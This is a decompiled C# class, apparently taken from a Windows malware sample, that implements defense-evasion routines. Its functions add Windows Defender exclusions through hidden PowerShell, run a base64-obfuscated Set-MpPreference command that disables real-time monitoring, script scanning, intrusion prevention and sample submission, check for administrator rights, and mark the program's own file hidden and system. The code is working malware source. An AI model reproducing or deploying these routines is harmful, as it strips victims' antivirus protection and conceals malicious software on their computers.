﻿using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace SHARP
{
	// Token: 0x02000068 RID: 104
	internal static class Syscalls
	{
		// Token: 0x0600023D RID: 573
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		// Token: 0x0600023E RID: 574 RVA: 0x0000E39C File Offset: 0x0000C59C
		internal static bool IsConsoleVisible()
		{
			return Syscalls.GetConsoleWindow() != IntPtr.Zero;
		}

		// Token: 0x0600023F RID: 575 RVA: 0x0000E3B0 File Offset: 0x0000C5B0
		internal static bool DefenderExclude(string path)
		{
			if (File.Exists(path) || Directory.Exists(path))
			{
				using (Process process = new Process())
				{
					process.StartInfo.FileName = "powershell.exe";
					process.StartInfo.Arguments = "Add-MpPreference -ExclusionPath '" + path + "'";
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.UseShellExecute = false;
					process.Start();
					process.WaitForExit();
					return process.ExitCode == 0;
				}
				return false;
			}
			return false;
		}

		// Token: 0x06000240 RID: 576 RVA: 0x0000E44C File Offset: 0x0000C64C
		internal static bool DisableDefender()
		{
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String("U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAy"));
			bool result;
			using (Process process = new Process())
			{
				process.StartInfo.FileName = "powershell.exe";
				process.StartInfo.Arguments = @string;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				process.WaitForExit();
				result = (process.ExitCode == 0);
			}
			return result;
		}

		// Token: 0x06000241 RID: 577 RVA: 0x0000E4DC File Offset: 0x0000C6DC
		internal static bool CheckAdminPrivileges()
		{
			bool result;
			using (WindowsIdentity current = WindowsIdentity.GetCurrent())
			{
				result = new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator);
			}
			return result;
		}

		// Token: 0x06000242 RID: 578 RVA: 0x0000E520 File Offset: 0x0000C720
		internal static void HideSelf()
		{
			using (Process process = new Process())
			{
				process.StartInfo.FileName = "attrib.exe";
				process.StartInfo.Arguments = "+h +s \"" + Assembly.GetCallingAssembly().Location + "\"";
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				process.WaitForExit();
			}
		}

		// Token: 0x04000137 RID: 311
		private static Mutex _mutex;
	}
}
